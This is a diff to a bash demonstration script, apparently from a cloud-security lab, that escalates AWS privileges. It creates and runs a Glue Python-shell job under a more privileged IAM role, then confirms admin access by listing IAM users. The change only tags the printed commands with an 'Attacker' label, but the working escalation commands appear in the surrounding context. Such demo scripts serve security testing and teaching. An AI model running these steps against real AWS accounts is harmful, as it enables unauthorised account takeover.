@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -90,7 +92,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -102,7 +104,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -110,7 +112,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify lack of admin permissions
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -147,7 +149,7 @@ TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
 echo "Job Name: $GLUE_JOB_NAME"
 
-show_attack_cmd "aws glue create-job --region $AWS_REGION --name \"$GLUE_JOB_NAME\" --role \"$TARGET_ROLE_ARN\" --command \"Name=pythonshell,ScriptLocation=${SCRIPT_S3_PATH},PythonVersion=3.9\" --default-arguments '{\"--job-language\":\"python\"}' --max-capacity 0.0625 --timeout 5 --output json"
+show_attack_cmd "Attacker" "aws glue create-job --region $AWS_REGION --name \"$GLUE_JOB_NAME\" --role \"$TARGET_ROLE_ARN\" --command \"Name=pythonshell,ScriptLocation=${SCRIPT_S3_PATH},PythonVersion=3.9\" --default-arguments '{\"--job-language\":\"python\"}' --max-capacity 0.0625 --timeout 5 --output json"
 aws glue create-job \
     --region $AWS_REGION \
     --name "$GLUE_JOB_NAME" \
@@ -170,7 +172,7 @@ echo ""
 echo -e "${YELLOW}Step 7: Starting Glue job run${NC}"
 echo "Starting job: $GLUE_JOB_NAME"
 
-show_attack_cmd "aws glue start-job-run --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --output json"
+show_attack_cmd "Attacker" "aws glue start-job-run --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --output json"
 JOB_RUN_OUTPUT=$(aws glue start-job-run \
     --region $AWS_REGION \
     --job-name "$GLUE_JOB_NAME" \
@@ -194,7 +196,7 @@ MAX_WAIT=300  # 5 minutes
 ELAPSED=0
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
-    show_cmd "aws glue get-job-run --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --run-id \"$JOB_RUN_ID\" --query 'JobRun.JobRunState' --output text"
+    show_cmd "Attacker" "aws glue get-job-run --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --run-id \"$JOB_RUN_ID\" --query 'JobRun.JobRunState' --output text"
     JOB_STATUS=$(aws glue get-job-run \
         --region $AWS_REGION \
         --job-name "$GLUE_JOB_NAME" \
@@ -238,7 +240,7 @@ echo -e "${GREEN}✓ Policy propagation complete${NC}\n"
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
